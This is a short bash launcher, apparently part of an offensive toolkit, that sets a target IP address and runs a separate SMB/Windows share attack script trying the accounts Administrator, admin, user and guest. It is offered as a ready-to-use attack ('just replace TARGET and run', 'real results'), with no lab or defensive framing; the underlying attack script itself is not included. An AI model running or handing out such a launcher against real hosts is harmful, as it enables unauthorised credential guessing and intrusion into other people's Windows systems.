#!/bin/bash
# SMB Quick Attack - Just replace TARGET and run!
# One-line change, fully functional, real results

# ====== CHANGE THIS LINE ======
TARGET="192.168.1.100"
# ==============================

# Don't change anything below this line
cd "$(dirname "$0")/.."
echo "🎯 Starting SMB/Windows Share Attack on $TARGET..."
echo "📝 Using Windows admin credentials"
echo "👤 Trying: Administrator, admin, user, guest"
echo ""
bash scripts/smb_admin_attack.sh -t "$TARGET" -v
